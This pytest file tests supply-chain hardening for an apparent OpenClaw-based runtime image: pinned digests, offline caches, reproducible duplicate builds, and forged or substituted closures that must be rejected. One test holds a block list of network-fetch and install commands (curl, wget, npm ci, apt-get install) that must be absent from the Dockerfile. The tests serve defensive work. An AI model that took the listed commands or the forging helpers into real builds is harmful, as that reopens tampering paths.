
def test_production_package_manager_trust_gate_stays_open_until_real_digests_are_pinned() -> None:
    assert image_publication.REVIEWED_RUNTIME_PACKAGE_MANAGER_ARTIFACT_SHA256 == {
        "openclaw-runtime": None,
        "bridge-node-modules": None,
    }

    with pytest.raises(RuntimeBuildClosureError, match="not pinned"):
        image_publication.reviewed_package_manager_artifact(
            component="openclaw-runtime",
            payload=_offline_package_manager_tar(
                "openclaw-runtime",
                _material("openclaw-runtime")["files"]["pnpm-lock.yaml"][
                    "payload"
                ],
            ),
        )


def test_bridge_dependency_cache_cannot_supply_caller_executable_javascript() -> None:
    exporter = FakeRuntimeSourceExporter()
    builder = FakeRuntimeDependencyBuilder()
    openclaw = _trusted_runtime_provider()[0]._artifacts["openclaw-runtime"]
    lock_payload = _material("bridge-node-modules")["files"][
        "package-lock.json"
    ]["payload"]
    payload = _offline_package_manager_tar(
        "bridge-node-modules",
        lock_payload,
        extra_files={"package-manager.cjs": b"process.exit(0)"},
    )
    provider = image_publication.TrustedRuntimeBuildMaterialProvider(
        exporter=exporter,
        builder=builder,
        package_manager_artifacts={
            "openclaw-runtime": openclaw,
            "bridge-node-modules": image_publication.PackageManagerArtifact(
                "npm",
                "11.12.1",
                payload,
                hashlib.sha256(payload).hexdigest(),
                "",
            ),
        },
    )

    with pytest.raises(RuntimeBuildClosureError, match="cache-only"):
        _prepare_closure(provider)

    assert builder.calls == []
    executor = image_publication.RUNTIME_BUILD_EXECUTOR.decode("utf-8")
    assert image_publication.BRIDGE_NPM_CLI in executor
    assert "package-manager.cjs ci" not in executor


def test_openclaw_pnpm_distribution_integrity_is_checked_before_execution() -> None:
    exporter = FakeRuntimeSourceExporter()
    builder = FakeRuntimeDependencyBuilder()
    bridge = _trusted_runtime_provider()[0]._artifacts["bridge-node-modules"]
    lock_payload = _material("openclaw-runtime")["files"]["pnpm-lock.yaml"][
        "payload"
    ]
    payload = _offline_package_manager_tar(
        "openclaw-runtime",
        lock_payload,
        distribution=_test_pnpm_distribution_tar() + b"substituted",
    )
    provider = image_publication.TrustedRuntimeBuildMaterialProvider(
        exporter=exporter,
        builder=builder,
        package_manager_artifacts={
            "openclaw-runtime": image_publication.PackageManagerArtifact(
                "pnpm",
                "11.2.2",
                payload,
                hashlib.sha256(payload).hexdigest(),
                hashlib.sha512(_test_pnpm_distribution_tar()).hexdigest(),
            ),
            "bridge-node-modules": bridge,
        },
    )

    with pytest.raises(RuntimeBuildClosureError, match="pnpm distribution"):
        _prepare_closure(provider)

    assert builder.calls == []


def test_offline_cache_manifest_must_exactly_match_authenticated_lock_integrities() -> None:
    provider, _, builder = _trusted_runtime_provider()
    artifact = provider._artifacts["openclaw-runtime"]
    payload = _offline_package_manager_tar(
        "openclaw-runtime",
        _material("openclaw-runtime")["files"]["pnpm-lock.yaml"]["payload"],
        manifest_integrities=["sha512-Zm9yZ2Vk"],
    )
    provider._artifacts["openclaw-runtime"] = replace(
        artifact,
        source=payload,
        reviewed_sha256=hashlib.sha256(payload).hexdigest(),
    )

    with pytest.raises(RuntimeBuildClosureError, match="integrity binding"):
        _prepare_closure(provider)

    assert builder.calls == []


def test_runtime_build_closure_rejects_a_self_asserted_material_provider() -> None:
    with pytest.raises(RuntimeBuildClosureError, match="trusted"):
        _prepare_closure(FakeClosureMaterialProvider())


def test_trusted_runtime_provider_binds_sources_recipes_and_fresh_builds() -> None:
    provider, exporter, builder = _trusted_runtime_provider()

    closure = _prepare_closure(provider)

    assert len(exporter.calls) == 4
    assert len(builder.calls) == 4
    assert {call["fresh_root_id"] for call in builder.calls} == {
        "openclaw-runtime-fresh-1",
        "openclaw-runtime-fresh-2",
        "bridge-node-modules-fresh-1",
        "bridge-node-modules-fresh-2",
    }
    assert all(call["network_mode"] == "none" for call in builder.calls)
    assert all(call["no_cache"] is True for call in builder.calls)
    assert all(call["pull"] is False for call in builder.calls)
    assert all(call["source_date_epoch"] == 0 for call in builder.calls)
    assert all(
        call["build_executor"] == image_publication.RUNTIME_BUILD_EXECUTOR
        for call in builder.calls
    )
    assert all(
        call["build_executor_sha256"]
        == hashlib.sha256(image_publication.RUNTIME_BUILD_EXECUTOR).hexdigest()
        for call in builder.calls
    )
    openclaw = json.loads(closure.artifacts["openclaw-runtime.manifest.json"])
    assert openclaw["sourceArchiveSha256"] == hashlib.sha256(
        _runtime_source_tar("openclaw-runtime")
    ).hexdigest()
    assert openclaw["packageSha256"] == hashlib.sha256(
        _material("openclaw-runtime")["files"]["package.json"]["payload"]
    ).hexdigest()
    assert openclaw["buildRecipeSha256"] == hashlib.sha256(
        _json(openclaw["buildRecipe"])
    ).hexdigest()
    assert openclaw["buildRecipe"]["executorSha256"] == hashlib.sha256(
        image_publication.RUNTIME_BUILD_EXECUTOR
    ).hexdigest()
    assert openclaw["toolchain"]["builderImage"] == NODE_BASE
    assert openclaw["toolchain"]["packageManagerArtifactSha256"] == (
        dict(closure.reviewed_package_manager_artifacts)["openclaw-runtime"]
    )
    root = json.loads(closure.artifacts["runtime-build-closure.json"])
    for binding in root["components"]:
        component = json.loads(
            closure.artifacts[binding["manifestName"]]
        )
        assert binding["packageManagerArtifactContractSha256"] == component[
            "toolchain"
        ]["packageManagerArtifactContractSha256"]
        assert binding["packageManagerDistributionSha512"] == component[
            "toolchain"
        ]["packageManagerDistributionSha512"]


def test_runtime_closure_independently_rejects_package_manager_digest_substitution() -> None:
    closure = _prepare_closure(_trusted_runtime_provider()[0])
    artifacts = dict(closure.artifacts)
    component = json.loads(artifacts["openclaw-runtime.manifest.json"])
    substituted = "f" * 64
    component["toolchain"]["packageManagerArtifactSha256"] = substituted
    component["toolchainSha256"] = hashlib.sha256(
        _json(component["toolchain"])
    ).hexdigest()
    artifacts["openclaw-runtime.manifest.json"] = _json(component)
    root = json.loads(artifacts["runtime-build-closure.json"])
    binding = next(
        item
        for item in root["components"]
        if item["component"] == "openclaw-runtime"
    )
    binding["manifestSha256"] = hashlib.sha256(
        artifacts["openclaw-runtime.manifest.json"]
    ).hexdigest()
    binding["buildRecipeSha256"] = component["buildRecipeSha256"]
    binding["packageManagerArtifactSha256"] = substituted
    artifacts["runtime-build-closure.json"] = _json(root)
    substituted_closure = type(closure)(
        artifacts,
        hashlib.sha256(artifacts["runtime-build-closure.json"]).hexdigest(),
        closure.reviewed_package_manager_artifacts,
    )

    with pytest.raises(
        RuntimeBuildClosureError,
        match="package-manager|root binding",
    ):
        image_publication._validate_runtime_build_closure(
            substituted_closure,
            release_commit=COMMIT,
            release_tree=TREE,
        )


class FakeClosureMaterialProvider:
    def __init__(self) -> None:
        self.calls: list[tuple[str, int]] = []
        self.results = {
            (component, attempt): _material(component)
            for component in ("openclaw-runtime", "bridge-node-modules")
            for attempt in (1, 2)
        }

    def build_material(self, *, component: str, attempt: int):
        self.calls.append((component, attempt))
        return deepcopy(self.results[(component, attempt)])


def _prepare_closure(provider):
    return prepare_runtime_build_closure(
        provider=provider,
        release_commit=COMMIT,
        release_tree=TREE,
        openclaw_commit=OPENCLAW_COMMIT,
        openclaw_tree=OPENCLAW_TREE,
    )


def test_runtime_build_closure_requires_two_identical_independent_materials() -> None:
    provider, exporter, builder = _trusted_runtime_provider()

    closure = _prepare_closure(provider)

    assert [
        (call["component"], call["attempt"]) for call in exporter.calls
    ] == [
        ("openclaw-runtime", 1),
        ("openclaw-runtime", 2),
        ("bridge-node-modules", 1),
        ("bridge-node-modules", 2),
    ]
    assert len(builder.calls) == 4
    assert set(closure.artifacts) == {
        "runtime-build-closure.json",
        "openclaw-runtime.manifest.json",
        "openclaw-runtime.tar.gz",
        "bridge-node-modules.manifest.json",
        "bridge-node-modules.tar.gz",
    }
    assert closure.manifest_sha256 == hashlib.sha256(
        closure.artifacts["runtime-build-closure.json"]
    ).hexdigest()
    openclaw = json.loads(closure.artifacts["openclaw-runtime.manifest.json"])
    bridge = json.loads(closure.artifacts["bridge-node-modules.manifest.json"])
    assert openclaw["sourceCommit"] == OPENCLAW_COMMIT
    assert openclaw["sourceTree"] == OPENCLAW_TREE
    assert bridge["sourceCommit"] == COMMIT
    assert bridge["sourceTree"] == TREE
    assert openclaw["outputSha256"]
    assert bridge["outputSha256"]
    assert openclaw["archiveSha256"] == hashlib.sha256(
        closure.artifacts["openclaw-runtime.tar.gz"]
    ).hexdigest()


def test_runtime_build_closure_rejects_an_unreviewed_openclaw_source() -> None:
    provider = _trusted_runtime_provider()[0]
    unreviewed = "f" * 40

    with pytest.raises(RuntimeBuildClosureError, match="audited OpenClaw commit"):
        prepare_runtime_build_closure(
            provider=provider,
            release_commit=COMMIT,
            release_tree=TREE,
            openclaw_commit=unreviewed,
            openclaw_tree=OPENCLAW_TREE,
        )


def test_runtime_build_closure_rejects_an_unreviewed_openclaw_tree() -> None:
    provider = _trusted_runtime_provider()[0]
    unreviewed = "f" * 40

    with pytest.raises(RuntimeBuildClosureError, match="audited OpenClaw tree"):
        prepare_runtime_build_closure(
            provider=provider,
            release_commit=COMMIT,
            release_tree=TREE,
            openclaw_commit=OPENCLAW_COMMIT,
            openclaw_tree=unreviewed,
        )


def test_runtime_build_closure_rejects_an_unreviewed_openclaw_version() -> None:
    provider, exporter, builder = _trusted_runtime_provider()
    material = _material("openclaw-runtime")
    material["files"]["package.json"]["payload"] = b'{"version":"2026.7.3"}\n'
    for attempt in (1, 2):
        exporter.archives[("openclaw-runtime", attempt)] = _runtime_source_tar(
            "openclaw-runtime", material
        )
        builder.results[("openclaw-runtime", attempt)]["package.json"][
            "payload"
        ] = b'{"version":"2026.7.3"}\n'

    with pytest.raises(RuntimeBuildClosureError, match="OpenClaw version"):
        _prepare_closure(provider)


def test_runtime_build_closure_rejects_unequal_duplicate_outputs() -> None:
    provider, _, builder = _trusted_runtime_provider()
    builder.results[("openclaw-runtime", 2)]["dist/runtime.js"][
        "payload"
    ] = b"different output"

    with pytest.raises(RuntimeBuildClosureError, match="independent.*differ"):
        _prepare_closure(provider)


def test_main_image_producer_rejects_substituted_runtime_build_closure() -> None:
    closure = _prepare_closure(_trusted_runtime_provider()[0])
    artifacts = dict(closure.artifacts)
    artifacts["openclaw-runtime.tar.gz"] += b"substituted"
    closure = type(closure)(
        artifacts,
        closure.manifest_sha256,
        closure.reviewed_package_manager_artifacts,
    )
    builder = FakeBuilder()

    with pytest.raises(RuntimeBuildClosureError, match="archive"):
        _prepare(closure=closure, builder=builder)

    assert builder.calls == []


def _forge_openclaw_closure(
    closure,
    *,
    source_commit: str | None = None,
    package_payload: bytes | None = None,
):
    artifacts = dict(closure.artifacts)
    manifest = json.loads(artifacts["openclaw-runtime.manifest.json"])
    if source_commit is not None:
        manifest["sourceCommit"] = source_commit
    if package_payload is not None:
        source = io.BytesIO(artifacts["openclaw-runtime.tar.gz"])
        tar_output = io.BytesIO()
        with tarfile.open(fileobj=source, mode="r:gz") as archive:
            with tarfile.open(
                fileobj=tar_output, mode="w", format=tarfile.USTAR_FORMAT
            ) as rewritten:
                for member in archive.getmembers():
                    extracted = archive.extractfile(member)
                    payload = extracted.read() if extracted is not None else b""
                    if member.name == "opt/openclaw/package.json":
                        payload = package_payload
                        member.size = len(payload)
                    rewritten.addfile(member, io.BytesIO(payload))
        compressed = io.BytesIO()
        with gzip.GzipFile(
            filename="",
            mode="wb",
            compresslevel=9,
            fileobj=compressed,
            mtime=0,
        ) as archive:
            archive.write(tar_output.getvalue())
        artifacts["openclaw-runtime.tar.gz"] = compressed.getvalue()
        package = next(
            item for item in manifest["files"] if item["path"] == "package.json"
        )
        package["sha256"] = hashlib.sha256(package_payload).hexdigest()
        package["size"] = len(package_payload)
        manifest["packageSha256"] = hashlib.sha256(package_payload).hexdigest()
        manifest["outputSha256"] = hashlib.sha256(
            _json(manifest["files"])
        ).hexdigest()
        manifest["archiveSha256"] = hashlib.sha256(
            artifacts["openclaw-runtime.tar.gz"]
        ).hexdigest()
        manifest["archiveSize"] = len(artifacts["openclaw-runtime.tar.gz"])
    artifacts["openclaw-runtime.manifest.json"] = _json(manifest)

    root = json.loads(artifacts["runtime-build-closure.json"])
    binding = next(
        item for item in root["components"] if item["component"] == "openclaw-runtime"
    )
    binding["manifestSha256"] = hashlib.sha256(
        artifacts["openclaw-runtime.manifest.json"]
    ).hexdigest()
    binding["archiveSha256"] = hashlib.sha256(
        artifacts["openclaw-runtime.tar.gz"]
    ).hexdigest()
    binding["outputSha256"] = manifest["outputSha256"]
    artifacts["runtime-build-closure.json"] = _json(root)
    return type(closure)(
        artifacts,
        hashlib.sha256(artifacts["runtime-build-closure.json"]).hexdigest(),
        closure.reviewed_package_manager_artifacts,
    )


def test_main_image_producer_reauthenticates_the_audited_openclaw_commit() -> None:
    closure = _forge_openclaw_closure(
        _prepare_closure(_trusted_runtime_provider()[0]),
        source_commit="f" * 40,
    )
    builder = FakeBuilder()

    with pytest.raises(RuntimeBuildClosureError, match="audited OpenClaw commit"):
        _prepare(closure=closure, builder=builder)

    assert builder.calls == []


def test_main_image_producer_reauthenticates_the_openclaw_version() -> None:
    closure = _forge_openclaw_closure(
        _prepare_closure(_trusted_runtime_provider()[0]),
        package_payload=b'{"version":"2026.7.3"}\n',
    )
    builder = FakeBuilder()

    with pytest.raises(RuntimeBuildClosureError, match="OpenClaw version"):
        _prepare(closure=closure, builder=builder)

    assert builder.calls == []


@pytest.mark.parametrize(
    ("component", "path"),
    [
        ("openclaw-runtime", "dist/runtime.js"),
        (
            "bridge-node-modules",
            "node_modules/@aws-sdk/client-s3/index.js",
        ),
    ],
)
def test_runtime_build_closure_rejects_incomplete_build_outputs(
    component: str,
    path: str,
) -> None:
    provider, _, builder = _trusted_runtime_provider()
    for attempt in (1, 2):
        builder.results[(component, attempt)].pop(path)

    with pytest.raises(RuntimeBuildClosureError, match="inventory"):
        _prepare_closure(provider)


@pytest.mark.parametrize(
    "path",
    [
        "node_modules/playwright-core/index.js",
        "node_modules/puppeteer/index.js",
        "node_modules/.cache/ms-playwright/chromium/chrome",
        "dist/browser-gateway.js",
    ],
)
def test_openclaw_closure_rejects_browser_packages_and_executables(path: str) -> None:
    provider, _, builder = _trusted_runtime_provider()
    for attempt in (1, 2):
        builder.results[("openclaw-runtime", attempt)][path] = {
            "payload": b"forbidden browser runtime",
            "mode": "0755" if path.endswith("chrome") else "0644",
        }

    with pytest.raises(RuntimeBuildClosureError, match="browser"):
        _prepare_closure(provider)


def test_runtime_dockerfile_consumes_only_verified_offline_closure() -> None:
    source = Path("bridge/Dockerfile").read_text()
    heredocs = [
        part.split("\nPY", 1)[0]
        for part in source.split("python3 - <<'PY'\n")[1:]
    ]
    assert len(heredocs) == 2
    for index, heredoc in enumerate(heredocs):
        compile(heredoc, f"bridge/Dockerfile:python-heredoc-{index}", "exec")
    from_lines = [
        line for line in source.splitlines() if line.startswith("FROM ")
    ]
    assert from_lines == ["FROM scratch"]
    assert "public.ecr.aws" not in "\n".join(from_lines)
    assert "ADD base/python-rootfs.tar /" in source
    assert "COPY --chmod=0755 base/node /usr/local/bin/node" in source
    assert "ARG PYTHON_BASE_ROOTFS_SHA256" in source
    assert "ARG NODE_BASE_BINARY_SHA256" in source
    assert 'python_base_rootfs_sha256 = env("PYTHON_BASE_ROOTFS_SHA256")' in source
    assert 'node_base_binary_sha256 = env("NODE_BASE_BINARY_SHA256")' in source
    assert 'digest(Path("/usr/local/bin/node").read_bytes())' in source
    dockerignore = {
        line
        for raw in Path("bridge/.dockerignore").read_text().splitlines()
        if (line := raw.strip()) and not line.startswith("#")
    }
    assert {
        "!base/",
        "base/**",
        "!base/python-rootfs.tar",
        "!base/node",
    } <= dockerignore
    assert "!base/**" not in dockerignore
    forbidden = (
        "apt-get update",
        "apt-get install",
        "git fetch",
        "corepack prepare",
        "pnpm install",
        "npm ci",
        "curl ",
        "wget ",
    )
    assert all(value not in source for value in forbidden)
    run_lines = [line for line in source.splitlines() if line.startswith("RUN ")]
    assert run_lines
    assert all(line.startswith("RUN --network=none ") for line in run_lines)
    for name in (
        "runtime-build-closure.json",
        "openclaw-runtime.manifest.json",
        "openclaw-runtime.tar.gz",
        "bridge-node-modules.manifest.json",
        "bridge-node-modules.tar.gz",
    ):
        assert name in source
    assert "OPENCLAW_RUNTIME_ARCHIVE_SHA256" in source
    assert "BRIDGE_NODE_MODULES_ARCHIVE_SHA256" in source
    assert "RUNTIME_BUILD_CLOSURE_MANIFEST_SHA256" in source
    expected_toolchain = source.split("expected_toolchain = {", 1)[1].split(
        "    }", 1
    )[0]
    assert '"packageManagerArtifactContractSha256"' in expected_toolchain
    assert '"packageManagerDistributionSha512"' in expected_toolchain
    command_gate = " ".join(FORBIDDEN_RUNTIME_COMMANDS)
    assert f"for command in {command_gate}; do" in source
    assert 'if command -v "$command"' in source
    for state in ("/etc/apt", "/var/cache/apt", "/var/lib/apt", "/var/lib/dpkg"):
        assert state in source
    for installer in (
        "/usr/local/lib/python3.13/ensurepip",
        "/usr/local/lib/python3.13/venv",
        "/usr/local/lib/python3.13/ensurepip/_bundled",
    ):
        assert installer in source
    assert "! python3 -m ensurepip --version" in source
    assert "! python3 -m pip --version" in source


def test_dockerignore_admits_only_the_five_exact_closure_artifacts() -> None:
    source = Path("bridge/.dockerignore").read_text()
    expected = {
        "!build-closure/runtime-build-closure.json",
        "!build-closure/openclaw-runtime.manifest.json",
        "!build-closure/openclaw-runtime.tar.gz",
        "!build-closure/bridge-node-modules.manifest.json",
        "!build-closure/bridge-node-modules.tar.gz",
    }
    assert expected.issubset(set(source.splitlines()))
    assert "!build-closure/**" not in source


def _test_pnpm_distribution_tar() -> bytes:
    output = io.BytesIO()
    with tarfile.open(
        fileobj=output, mode="w", format=tarfile.USTAR_FORMAT
    ) as archive:
        payload = b"// deterministic reviewed pnpm test distribution\n"
        item = tarfile.TarInfo("package/bin/pnpm.cjs")
        item.size = len(payload)
        item.mode = 0o644
        item.uid = item.gid = item.mtime = 0
        archive.addfile(item, io.BytesIO(payload))
    return output.getvalue()


def _offline_package_manager_tar(
    component: str,
    lock_payload: bytes,
    *,
    distribution: bytes | None = None,
    extra_files: dict[str, bytes] | None = None,
    manifest_integrities: list[str] | None = None,
) -> bytes:
    files = (
        {
            "pnpm-distribution.tgz": (
                distribution
                if distribution is not None
                else _test_pnpm_distribution_tar()
            ),
            "store/content.dat": b"lock-bound pnpm store",
        }
        if component == "openclaw-runtime"
        else {"cache/content.dat": b"lock-bound npm cache"}
    )
    files.update(extra_files or {})
    integrities = sorted(
        set(
            image_publication._LOCK_INTEGRITY.findall(
                lock_payload.decode("utf-8")
            )
        )
    )
    manifest = _json(
        {
            "schema": "personal-operator.offline-dependency-cache.v1",
            "component": component,
            "lockSha256": hashlib.sha256(lock_payload).hexdigest(),
            "lockIntegrities": (
                manifest_integrities
                if manifest_integrities is not None
                else integrities
            ),
            "files": [
                {
                    "path": path,
                    "sha256": hashlib.sha256(payload).hexdigest(),
                    "size": len(payload),
                }
                for path, payload in sorted(files.items())
            ],
        }
    )
    files["integrity-manifest.json"] = manifest
    output = io.BytesIO()
    with tarfile.open(
        fileobj=output, mode="w", format=tarfile.USTAR_FORMAT
    ) as archive:
        for path, payload in sorted(files.items()):
            item = tarfile.TarInfo(path)
            item.size = len(payload)
            item.mode = 0o644
            item.uid = item.gid = item.mtime = 0
            archive.addfile(item, io.BytesIO(payload))
    return output.getvalue()


class _UnboundedReadRejected(AssertionError):
    """Raised when a stream consumer issues an unbounded ``read()``."""


class _BoundedOnlyReader:
    """A file object that fails closed if asked for an unbounded read.

    A correct streaming consumer always passes an explicit chunk size, so this
    reader proves the retained-artifact tar is never slurped whole.
    """

    def __init__(self, payload: bytes) -> None:
        self._stream = io.BytesIO(payload)
        self.unbounded_reads = 0

    def read(self, size=-1):
        if size is None or size < 0:
            self.unbounded_reads += 1
            raise _UnboundedReadRejected(
                "artifact stream issued an unbounded read"
            )
        return self._stream.read(size)

    def seek(self, *args, **kwargs):
        return self._stream.seek(*args, **kwargs)

    def tell(self):
        return self._stream.tell()

    def readable(self):
        return True

    def seekable(self):
        return True

    def close(self):
        self._stream.close()


class _BoundedOnlyArtifactSource:
    """An :class:`ArtifactSource` whose reads must all be bounded."""

    def __init__(self, payload: bytes) -> None:
        self._payload = payload
        self.sha256 = hashlib.sha256(payload).hexdigest()
        self.size = len(payload)
        self.readers: list[_BoundedOnlyReader] = []

    @contextmanager
    def open(self):
        reader = _BoundedOnlyReader(self._payload)
        self.readers.append(reader)
        try:
            yield reader
        finally:
            reader.close()

    def stream_into(self, dest_path) -> None:  # pragma: no cover - unused here
        with self.open() as reader:
            with open(dest_path, "xb") as handle:
                while True:
                    block = reader.read(1024 * 1024)
                    if not block:
                        break
                    handle.write(block)


def test_sentinel_reader_proves_unbounded_reads_are_detectable() -> None:
    reader = _BoundedOnlyReader(b"payload-bytes")
    assert reader.read(4) == b"payl"
    with pytest.raises(_UnboundedReadRejected):
        reader.read()


def test_offline_artifact_contract_streams_the_tar_without_unbounded_reads() -> None:
    lock_payload = _material("openclaw-runtime")["files"]["pnpm-lock.yaml"][
        "payload"
    ]
    payload = _offline_package_manager_tar("openclaw-runtime", lock_payload)
    source = _BoundedOnlyArtifactSource(payload)
    artifact = image_publication.PackageManagerArtifact(
        "pnpm",
        "11.2.2",
        source,
        source.sha256,
        hashlib.sha512(_test_pnpm_distribution_tar()).hexdigest(),
    )

    contract = image_publication._offline_artifact_contract(
        component="openclaw-runtime",
        artifact=artifact,
        lock_payload=lock_payload,
    )

    assert len(contract) == 64
    assert source.readers, "the contract must open the retained artifact"
    assert all(
        reader.unbounded_reads == 0 for reader in source.readers
    ), "the contract issued an unbounded read of the whole artifact"


def test_retained_regular_file_streams_the_same_inode_and_fails_closed(
    tmp_path: Path,
) -> None:
    payload = b"reviewed-offline-artifact-bytes" * 4096
    artifact_path = tmp_path / "offline.tar"
    artifact_path.write_bytes(payload)

    retained = image_publication.RetainedRegularFile.establish(artifact_path)
    try:
        assert retained.size == len(payload)
        assert retained.sha256 == hashlib.sha256(payload).hexdigest()

        with retained.open() as reader:
            streamed = b""
            while True:
                block = reader.read(4096)
                if not block:
                    break
                streamed += block
        assert streamed == payload

        destination = tmp_path / "copied.tar"
        retained.stream_into(destination)
        assert destination.read_bytes() == payload

        # Replacing the caller path with a different inode must NOT change what
        # the retained descriptor reads: reads are of the same, original inode.
        artifact_path.unlink()
        artifact_path.write_bytes(b"different inode contents")
        with retained.open() as reader:
            assert reader.read(len(payload) + 1) == payload
    finally:
        retained.close()


def test_retained_regular_file_fails_closed_on_in_place_inode_drift(
    tmp_path: Path,
) -> None:
    payload = b"reviewed-offline-artifact-bytes" * 4096
    artifact_path = tmp_path / "offline.tar"
    artifact_path.write_bytes(payload)

    retained = image_publication.RetainedRegularFile.establish(artifact_path)
    try:
        # Truncating the retained inode in place must be caught on the next
        # revalidation: the recorded size no longer matches the live fstat.
        with open(artifact_path, "r+b") as handle:
            handle.truncate(len(payload) // 2)
        with pytest.raises(
            RuntimeBuildClosureError, match="inode differs"
        ):
            with retained.open() as reader:
                reader.read(16)
    finally:
        retained.close()


def test_retained_regular_file_rejects_empty_and_symlink_inputs(
    tmp_path: Path,
) -> None:
    empty = tmp_path / "empty.tar"
    empty.write_bytes(b"")
    with pytest.raises(
        RuntimeBuildClosureError, match="bounded regular file"
    ):
        image_publication.RetainedRegularFile.establish(empty)

    target = tmp_path / "target.tar"
    target.write_bytes(b"payload")
    link = tmp_path / "link.tar"
    link.symlink_to(target)
    with pytest.raises(RuntimeBuildClosureError, match="unavailable"):
        image_publication.RetainedRegularFile.establish(link)


def test_closure_preparer_exports_git_objects_and_runs_fresh_offline_builds(
    tmp_path: Path,
    monkeypatch,
) -> None:
    script = Path("scripts/prepare-runtime-build-closure.py").resolve()
    specification = importlib.util.spec_from_file_location(
        "prepare_runtime_build_closure_script", script
    )
    assert specification is not None and specification.loader is not None
    module = importlib.util.module_from_spec(specification)
    specification.loader.exec_module(module)
    assert not hasattr(module, "DirectoryMaterialProvider")

    release_repository = tmp_path / "release-repository"
    openclaw_repository = tmp_path / "openclaw-repository"
    release_repository.mkdir()
    openclaw_repository.mkdir()
    real_subprocess_run = subprocess.run

    def initialize_repository(repository: Path, component: str) -> tuple[str, str]:
        with tarfile.open(
            fileobj=io.BytesIO(_runtime_source_tar(component)), mode="r:"
        ) as archive:
            for member in archive.getmembers():
                target = repository / member.name
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(archive.extractfile(member).read())
                target.chmod(member.mode)
        for arguments in (
            ["init", "--quiet"],
            ["config", "user.name", "Personal Operator Test"],
            ["config", "user.email", "personal-operator@example.invalid"],
            ["add", "."],
            ["commit", "--quiet", "-m", "runtime source"],
        ):
            completed = real_subprocess_run(
                ["/usr/bin/git", "-C", str(repository), *arguments],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            assert completed.returncode == 0, completed.stderr
        identities = []
        for expression in ("HEAD^{commit}", "HEAD^{tree}"):
            completed = real_subprocess_run(
                [
                    "/usr/bin/git",
                    "-C",
                    str(repository),
                    "rev-parse",
                    expression,
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False,
            )
            assert completed.returncode == 0, completed.stderr
            identities.append(completed.stdout.decode().strip())
        return identities[0], identities[1]

    release_commit, release_tree = initialize_repository(
        release_repository, "bridge-node-modules"
    )
    openclaw_commit, openclaw_tree = initialize_repository(
        openclaw_repository, "openclaw-runtime"
    )
    monkeypatch.setattr(
        image_publication, "OPENCLAW_RUNTIME_COMMIT", openclaw_commit
    )
    monkeypatch.setattr(
        image_publication, "OPENCLAW_RUNTIME_TREE", openclaw_tree
    )
    monkeypatch.setattr(
        image_production, "OPENCLAW_RUNTIME_COMMIT", openclaw_commit
    )
    monkeypatch.setattr(
        image_production, "OPENCLAW_RUNTIME_TREE", openclaw_tree
    )
    openclaw_package_artifact = _offline_package_manager_tar(
        "openclaw-runtime",
        _material("openclaw-runtime")["files"]["pnpm-lock.yaml"]["payload"],
    )
    bridge_package_artifact = _offline_package_manager_tar(
        "bridge-node-modules",
        _material("bridge-node-modules")["files"]["package-lock.json"][
            "payload"
        ],
    )
    monkeypatch.setattr(
        image_publication,
        "REVIEWED_RUNTIME_PACKAGE_MANAGER_ARTIFACT_SHA256",
        {
            "openclaw-runtime": hashlib.sha256(
                openclaw_package_artifact
            ).hexdigest(),
            "bridge-node-modules": hashlib.sha256(
                bridge_package_artifact
            ).hexdigest(),
        },
    )
    monkeypatch.setattr(
        image_publication,
        "OPENCLAW_PNPM_DISTRIBUTION_SHA512",
        hashlib.sha512(_test_pnpm_distribution_tar()).hexdigest(),
    )
    openclaw_artifact = tmp_path / "pnpm-offline.tar"
    bridge_artifact = tmp_path / "npm-offline.tar"
    openclaw_artifact.write_bytes(openclaw_package_artifact)
    bridge_artifact.write_bytes(bridge_package_artifact)
    git_calls: list[list[str]] = []
    container_calls: list[list[str]] = []

    def fake_run(command, **kwargs):
        command = [str(value) for value in command]
        if Path(command[0]).name == "git":
            git_calls.append(command)
            return real_subprocess_run(command, **kwargs)
        container_calls.append(command)
        output_mount = next(
            command[index + 1]
            for index, value in enumerate(command)
            if value == "--mount" and "dst=/output" in command[index + 1]
        )
        output_root = Path(
            next(
                part.removeprefix("src=")
                for part in output_mount.split(",")
                if part.startswith("src=")
            )
        ) / "payload"
        component = next(
            value.split("=", 1)[1]
            for value in command
            if value.startswith("PERSONAL_OPERATOR_BUILD_COMPONENT=")
        )
        for relative, raw in _material(component)["files"].items():
            target = output_root / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(raw["payload"])
            target.chmod(int(raw["mode"], 8))
        return subprocess.CompletedProcess(command, 0, b"", b"")

    monkeypatch.setattr(image_production.subprocess, "run", fake_run)
    output = tmp_path / "closure"
    arguments = [
        "--release-repository",
        str(release_repository),
        "--openclaw-repository",
        str(openclaw_repository),
        "--openclaw-package-manager-artifact",
        str(openclaw_artifact),
        "--bridge-package-manager-artifact",
        str(bridge_artifact),
        "--release-commit",
        release_commit,
        "--release-tree",
        release_tree,
        "--openclaw-commit",
        openclaw_commit,
        "--openclaw-tree",
        openclaw_tree,
        "--output",
        str(output),
    ]

    reviewed_root = tmp_path / "reviewed"
    reviewed_root.mkdir()
    with _reviewed_execution(
        reviewed_root, monkeypatch, real_git=True
    ) as execution:
        monkeypatch.setattr(
            module,
            "open_reviewed_local_execution",
            lambda: execution,
        )
        assert module.main(arguments) == 0
    assert len(git_calls) == 14
    assert len(container_calls) == 4
    assert all("--network=none" in call for call in container_calls)
    assert all("--pull=never" in call for call in container_calls)
    assert all("--read-only" in call for call in container_calls)
    assert all("--cap-drop=ALL" in call for call in container_calls)
    assert all("TMPDIR=/work/tmp" in call for call in container_calls)
    assert len(
        {
            next(
                value
                for value in call
                if value.startswith("PERSONAL_OPERATOR_FRESH_ROOT=")
            )
            for call in container_calls
        }
    ) == 4
    assert {path.name for path in output.iterdir()} == {
        "runtime-build-closure.json",
        "openclaw-runtime.manifest.json",
        "openclaw-runtime.tar.gz",
        "bridge-node-modules.manifest.json",
        "bridge-node-modules.tar.gz",
    }
    assert module.main(arguments) == 1
    blocked_arguments = [
        str(tmp_path / "blocked-closure") if value == str(output) else value
        for value in arguments
    ]

    def reject_reviewed_execution():
        raise ImagePublicationError("reviewed execution unavailable")

    monkeypatch.setattr(
        module,
        "open_reviewed_local_execution",
        reject_reviewed_execution,
    )
    assert module.main(blocked_arguments) == 1


def test_closure_preparer_has_no_prebuilt_directory_bypass() -> None:
    source = Path("scripts/prepare-runtime-build-closure.py").read_text()
    assert "DirectoryMaterialProvider" not in source
    assert "--openclaw-build-a" not in source
    assert "--bridge-build-a" not in source
